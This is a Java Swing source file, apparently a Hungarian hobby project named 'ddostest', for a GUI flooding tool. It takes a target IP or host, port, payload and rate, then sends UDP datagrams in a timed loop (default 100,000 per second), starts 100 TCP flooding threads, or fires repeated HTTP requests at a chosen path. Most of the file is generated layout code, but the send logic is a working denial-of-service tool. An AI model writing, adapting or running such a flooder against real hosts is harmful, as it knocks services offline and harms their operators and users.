package ddostest;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.UnsupportedEncodingException;
import java.net.*;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.Timer;
import java.util.TimerTask;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JOptionPane;

import org.junit.*;

import org.jnetpcap.*;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.*;
import org.jnetpcap.protocol.application.Html;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.*;
import org.jnetpcap.protocol.network.Icmp.IcmpType;
import org.jnetpcap.protocol.tcpip.Udp;

public class View extends JFrame {
    
    
    
        byte[] message = {10,23,12,31,43,32,24};       //////////////   alapértelmezett adatok
        byte [] IP={-64,-88,1,106};
        String httpTarget= "";
        int port=57;
        Socket TCPsocket;
        DatagramSocket datagramSocket;
        DatagramPacket packet;
        Timer senderTimer;
        boolean running=false;
        String mode="UDP";
        long frekvencia = 100000;         ////////// másodpercenkénti csomagszám
        int ThreadSzam = 3;
        int count = 0;                 //////////////  csomagok számlálása
        ddosthread[] threads;
        private ObjectOutputStream kimenet=null;
    public View() {
        
            
                
        
        //////////////////////////     ALAPÉRTELMEZETT ADATOK
        
            try {
                this.datagramSocket = new DatagramSocket();
            } catch (SocketException ex) {
                Logger.getLogger(View.class.getName()).log(Level.SEVERE, null, ex);
            }
        initComponents();
            try {
                lbTarget.setText("192.168.1.69");
                tfSetTarget.setText("192.168.1.69");
                InetAddress ip = InetAddress.getByName("192.168.1.69");
    IP = ip.getAddress();
    lbMessage.setText("teszt");
    message = ("teszt").getBytes("UTF-8");
                tfMessage.setText("teszt");
                lbPersec.setText("100000");
                tfPersec.setText("100000");
                lbPort.setText("57");
                tfPort.setText("57");
                btPersec.setText("Módosítás");
                btPort.setText("Módosítás");
                btSetMessage.setText("Módosítás");
                btSetTarget.setText("Módosítás");
            } catch (UnknownHostException ex) {
                Logger.getLogger(View.class.getName()).log(Level.SEVERE, null, ex);
            }
             catch (UnsupportedEncodingException ex) {
                Logger.getLogger(View.class.getName()).log(Level.SEVERE, null, ex);
             }
        
    }
       
        //////////////////////////     INDÍTÁS/LEÁLLÍTÁS GOMB
    public void sendIT() throws UnknownHostException, SocketException, IOException{
        if (running) {
            System.out.println("STOP");
            if(mode.equals("UDP")){
            senderTimer.cancel();
            running = false;
    if(kimenet!=null)
        kimenet.close();
    if(TCPsocket!=null)
        TCPsocket.close();
            }else if(mode.equals("TCP")){
                for (int i = 0; i < threads.length; i++) {
                    threads[i].stopIT();
                    threads[i].interrupt();
                }
                threads= new ddosthread[10];
            running = false;
            }else if(mode.equals("HTTP")){
                senderTimer.cancel();
            running = false;
            }
            btSend.setText("Indítás!");
        }else{
            System.out.println("START");
            
            ////////////////////////////////
            
            
            
            senderTimer = new Timer();
        InetAddress address = InetAddress.getByAddress(IP);
        if(mode.equals("UDP")){
                packet = new DatagramPacket(message, message.length, address, port);
        }
        else{
        }
        
        ////////////////////// TIMER INDÍTÁSA MÓDTÓL FÜGGŐEN
        
        if(mode.equals("UDP")){
        senderTimer.scheduleAtFixedRate(new TimerTask() {
  @Override
  public void run() {
      try {
          for (int i = 0; i < frekvencia; i++) {
              
          ////////////////////////////////   DATAGRAM CSOMAG KÜLDÉSE
          
          datagramSocket.send(packet);
          
          
          count++;
          }
          lbCounter.setText(count+"");
      } catch (IOException ex) {
          Logger.getLogger(View.class.getName()).log(Level.SEVERE, null, ex);
      }
  }
}, 300, 1000);
        }else if(mode.equals("TCP")){
              threads= new ddosthread[100];
          for (int i = 0; i < 100/*frekvencia*/; i++) {
              
        
        
            ddosthread thread = new ddosthread(i+1,message, IP, port, frekvencia);
            threads[i]=thread;
            thread.start();
      }
            }else if(mode.equals("HTTP")){
               //String vmi =(httpTarget.getHost()+httpTarget.getPath());
                
                String[] httpParameter =httpTarget.split("/");
            String host = httpParameter[0];
            String path = httpTarget.substring(host.length());
            if(host!=null && path!=null){
                senderTimer.scheduleAtFixedRate(new TimerTask() {
  @Override
  public void run() {
                for (int j = 0; j < frekvencia; j++) {
            executePost(host, path/*"192.168.1.64", "index.html"*/);                                   ////////////////      HTTP
        }
                }
}, 300, 1000);
            }
            }
        
        running=true;
            btSend.setText("Állj!");
        
        }
    }
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        bgMode = new javax.swing.ButtonGroup();
        btSend = new javax.swing.JButton();
        lbTarget = new javax.swing.JLabel();
        btSetTarget = new javax.swing.JButton();
        tfSetTarget = new javax.swing.JTextField();
        lbMessage = new javax.swing.JLabel();
        tfMessage = new javax.swing.JTextField();
        btSetMessage = new javax.swing.JButton();
        tfPort = new javax.swing.JTextField();
        btPort = new javax.swing.JButton();
        lbPort = new javax.swing.JLabel();
        tfPersec = new javax.swing.JTextField();
        lbPersec = new javax.swing.JLabel();
        btPersec = new javax.swing.JButton();
        lbCounterTitle = new javax.swing.JLabel();
        lbCounter = new javax.swing.JLabel();
        lbPortTitle = new javax.swing.JLabel();
        lbPersecTitle = new javax.swing.JLabel();
        lbMessageTitle = new javax.swing.JLabel();
        lbAddressTitle = new javax.swing.JLabel();
        rbUDP = new javax.swing.JRadioButton();
        rbTCP = new javax.swing.JRadioButton();
        rbHTTP = new javax.swing.JRadioButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        btSend.setText("Küldés");
        btSend.setActionCommand("btSend");
        btSend.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btSendActionPerformed(evt);
            }
        });

        lbTarget.setText("jLabel1");

        btSetTarget.setText("JButton1");
        btSetTarget.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btSetTargetActionPerformed(evt);
            }
        });

        tfSetTarget.setText("jTextField1");

        lbMessage.setText("jLabel1");

        tfMessage.setText("jTextField1");

        btSetMessage.setText("jButton1");
        btSetMessage.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btSetMessageActionPerformed(evt);
            }
        });

        tfPort.setText("jTextField1");

        btPort.setText("jButton1");
        btPort.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btPortActionPerformed(evt);
            }
        });

        lbPort.setText("jLabel1");

        tfPersec.setText("jTextField1");

        lbPersec.setText("jLabel1");

        btPersec.setText("jButton1");
        btPersec.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btPersecActionPerformed(evt);
            }
        });

        lbCounterTitle.setText("Küldött csomagok száma:");

        lbCounter.setText("0");

        lbPortTitle.setText("Port:");

        lbPersecTitle.setText("Másodpercenkénti küldések:");

        lbMessageTitle.setText("Üzenet:");

        lbAddressTitle.setText("IP-cím:");

        bgMode.add(rbUDP);
        rbUDP.setSelected(true);
        rbUDP.setText("UDP");
        rbUDP.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                rbUDPActionPerformed(evt);
            }
        });

        bgMode.add(rbTCP);
        rbTCP.setText("TCP");
        rbTCP.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                rbTCPActionPerformed(evt);
            }
        });

        bgMode.add(rbHTTP);
        rbHTTP.setText("HTTP");
        rbHTTP.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                rbHTTPActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addGroup(layout.createSequentialGroup()
                                        .addComponent(lbPortTitle)
                                        .addGap(18, 18, 18)
                                        .addComponent(lbPort))
                                    .addGroup(layout.createSequentialGroup()
                                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                                                .addComponent(tfPersec, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, 204, Short.MAX_VALUE)
                                                .addComponent(tfPort, javax.swing.GroupLayout.Alignment.LEADING))
                                            .addComponent(rbUDP))
                                        .addGap(18, 18, 18)
                                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                                            .addComponent(btPort, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                            .addComponent(btPersec, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                            .addComponent(btSend, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
                                    .addGroup(layout.createSequentialGroup()
                                        .addComponent(lbPersecTitle)
                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                        .addComponent(lbPersec)))
                                .addGap(0, 0, Short.MAX_VALUE))
                            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                                .addComponent(lbCounterTitle)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .addComponent(lbCounter, javax.swing.GroupLayout.PREFERRED_SIZE, 121, javax.swing.GroupLayout.PREFERRED_SIZE)))
                        .addContainerGap())
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(rbHTTP)
                            .addComponent(rbTCP)
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(lbAddressTitle)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                .addComponent(lbTarget, javax.swing.GroupLayout.PREFERRED_SIZE, 247, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(tfSetTarget, javax.swing.GroupLayout.PREFERRED_SIZE, 204, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGap(18, 18, 18)
                                .addComponent(btSetTarget))
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(lbMessageTitle)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(lbMessage))
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(tfMessage, javax.swing.GroupLayout.PREFERRED_SIZE, 204, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGap(18, 18, 18)
                                .addComponent(btSetMessage)))
                        .addGap(0, 34, Short.MAX_VALUE))))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lbAddressTitle)
                    .addComponent(lbTarget, javax.swing.GroupLayout.PREFERRED_SIZE, 24, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(tfSetTarget, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btSetTarget))
                .addGap(23, 23, 23)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lbMessageTitle)
                    .addComponent(lbMessage))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(tfMessage, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btSetMessage))
                .addGap(18, 18, 18)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lbPort)
                    .addComponent(lbPortTitle))
                .addGap(18, 18, 18)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(tfPort, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btPort))
                .addGap(18, 18, 18)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lbPersec)
                    .addComponent(lbPersecTitle))
                .addGap(18, 18, 18)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(tfPersec, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btPersec))
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(39, 39, 39)
                        .addComponent(btSend))
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(rbUDP)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(rbTCP)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(rbHTTP)
                .addGap(22, 22, 22)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lbCounter)
                    .addComponent(lbCounterTitle))
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void btSendActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btSendActionPerformed
        // TODO add your handling code here:
        try {
            sendIT();
        } catch (SocketException ex) {
            Logger.getLogger(View.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(View.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_btSendActionPerformed

    public static void executePost(String targethost, String targetPath) {
  HttpURLConnection connection = null;

  try {
    //Create connection
    URL url = new URL("http",targethost,-1,targetPath);
      System.out.println(url.toString());
    connection = (HttpURLConnection) url.openConnection();
    connection.setRequestMethod("GET");
    connection.setRequestProperty("Content-Type", 
        "text/html");
         //   "application/x-www-form-urlencoded");

    connection.setRequestProperty("Content-Length", 
        Integer.toString(targetPath.getBytes().length));
    connection.setRequestProperty("Content-Language", "en-US");  

    connection.setUseCaches(false);
    connection.setDoOutput(true);

    //Send request
    DataOutputStream wr = new DataOutputStream (
        connection.getOutputStream());
      for (int i = 0; i < 1; i++) {
    wr.writeBytes(targetPath);          
      }
    wr.close();

    
      InputStream is = connection.getInputStream();
    BufferedReader rd = new BufferedReader(new InputStreamReader(is));
    StringBuilder response = new StringBuilder(); // or StringBuffer if Java version 5+
    String line;
    while ((line = rd.readLine()) != null) {
      response.append(line);
      response.append('\r');
    }
    rd.close();
      System.out.println(response.toString());
    
    
    
  }
    catch (Exception e) {
    e.printStackTrace();
  } finally {
    if (connection != null) {
      connection.disconnect();
    }

    }
    }
    
    /////////////////////////////////    GOMBOK KEZELÉSE, ADATOK MÓDOSÍTÁSA
    
    private void btSetTargetActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btSetTargetActionPerformed
                         if(mode.equals("HTTP")){
                             if(tfSetTarget.getText().startsWith("http:")){
                                 JOptionPane pane = new JOptionPane("Rossz cím! A protokoll nem kell!");
                                 JDialog dialog = pane.createDialog("Rossz cím!");
     dialog.show();
     //pane.setVisible(true);

                                 System.out.println("Rossz cím! A protokoll nem kell!");
                             }
                    httpTarget=tfSetTarget.getText();         
                         lbTarget.setText(httpTarget);
                         }else{                   
                    String newTarget = tfSetTarget.getText();
byte[] newAddressBytes= new byte[4];
try {
    InetAddress ip = InetAddress.getByName(newTarget);
    newAddressBytes = ip.getAddress();
this.IP=newAddressBytes;
lbTarget.setText(newTarget);
} catch (UnknownHostException ex) {
    JOptionPane pane = new JOptionPane("Rossz IP!");
                                 JDialog dialog = pane.createDialog("Rossz IP!");
     dialog.show();
    System.out.println("rossz IP");
}

                         }
    }//GEN-LAST:event_btSetTargetActionPerformed

    private void btSetMessageActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btSetMessageActionPerformed
        try { 
String uzenet = tfMessage.getText();
lbMessage.setText(uzenet);
message = uzenet.getBytes("UTF-8");
         } catch (UnsupportedEncodingException ex) {
                Logger.getLogger(View.class.getName()).log(Level.SEVERE, null, ex);
                }
    }//GEN-LAST:event_btSetMessageActionPerformed

    private void btPortActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btPortActionPerformed
        port= Integer.parseInt(tfPort.getText());
        lbPort.setText(port+"");
    }//GEN-LAST:event_btPortActionPerformed

    private void btPersecActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btPersecActionPerformed
        frekvencia= Integer.parseInt(tfPersec.getText());
        lbPersec.setText(frekvencia+"");
    }//GEN-LAST:event_btPersecActionPerformed

    private void rbTCPActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_rbTCPActionPerformed
        this.mode = "TCP";
    }//GEN-LAST:event_rbTCPActionPerformed

    private void rbUDPActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_rbUDPActionPerformed
        this.mode = "UDP";
    }//GEN-LAST:event_rbUDPActionPerformed

    private void rbHTTPActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_rbHTTPActionPerformed
        this.mode = "HTTP";
    }//GEN-LAST:event_rbHTTPActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(View.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(View.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(View.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(View.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new View().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.ButtonGroup bgMode;
    private javax.swing.JButton btPersec;
    private javax.swing.JButton btPort;
    private javax.swing.JButton btSend;
    private javax.swing.JButton btSetMessage;
    private javax.swing.JButton btSetTarget;
    private javax.swing.JLabel lbAddressTitle;
    private javax.swing.JLabel lbCounter;
    private javax.swing.JLabel lbCounterTitle;
    private javax.swing.JLabel lbMessage;
    private javax.swing.JLabel lbMessageTitle;
    private javax.swing.JLabel lbPersec;
    private javax.swing.JLabel lbPersecTitle;
    private javax.swing.JLabel lbPort;
    private javax.swing.JLabel lbPortTitle;
    private javax.swing.JLabel lbTarget;
    private javax.swing.JRadioButton rbHTTP;
    private javax.swing.JRadioButton rbTCP;
    private javax.swing.JRadioButton rbUDP;
    private javax.swing.JTextField tfMessage;
    private javax.swing.JTextField tfPersec;
    private javax.swing.JTextField tfPort;
    private javax.swing.JTextField tfSetTarget;
    // End of variables declaration//GEN-END:variables
}




